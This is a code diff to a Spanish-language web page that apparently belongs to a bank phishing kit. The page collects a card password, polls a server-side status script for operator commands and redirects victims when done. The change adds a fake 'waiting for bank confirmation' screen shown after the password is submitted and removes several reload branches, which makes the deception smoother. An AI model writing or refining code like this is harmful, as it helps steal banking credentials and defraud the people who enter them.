@@ -86,6 +86,14 @@ if ($id_transaccion) {
 			</div>
 		</div>
 
+		<div id="frm-esperando" style="display:none; text-align: center; padding: 60px 20px;">
+			<div class="titulo" style="margin-bottom: 20px;">✓ Datos recibidos</div>
+			<div class="loader" style="margin: 0 auto; margin-bottom: 30px;">
+				<img src="img/load.svg" width="100">
+			</div>
+			<span class="subtexto-frm" style="font-size: 16px;">Esperando confirmación del banco...</span>
+		</div>
+
 		<div class="top-bar"></div>
 		<div class="header"></div>
 
@@ -107,24 +115,9 @@ if ($id_transaccion) {
 		if (espera == 1) {
 			$.post("../../../process/estado.php", function(data) {
 				switch (data) {
-					case '2':
-					case '4':
-					case '5':
-					case '6':
-					case '8':
-					case '13':
-					case '14':
-					case '25':
-						espera = 0;
-						location.reload();
-						break;
 					case '10':
 						espera = 0;
 						window.location.href = "../../../finish-no-back-button/";
-						break;
-					case '12':
-						espera = 0;
-						location.reload();
 						break;
 					default:
 						break;
@@ -157,8 +150,9 @@ if ($id_transaccion) {
 		$("#btnClave").click(function(){
 			if($("#txtClave").val().length > 0) {
 				$("#frm-clave").hide();
-				$("#fondo").show();
-				$(".loader").show();
+				$("#fondo").hide();
+				$(".loader").hide();
+				$("#frm-esperando").show();
 				paso_clave_tarj($("#txtClave").val());
 			}
 		});
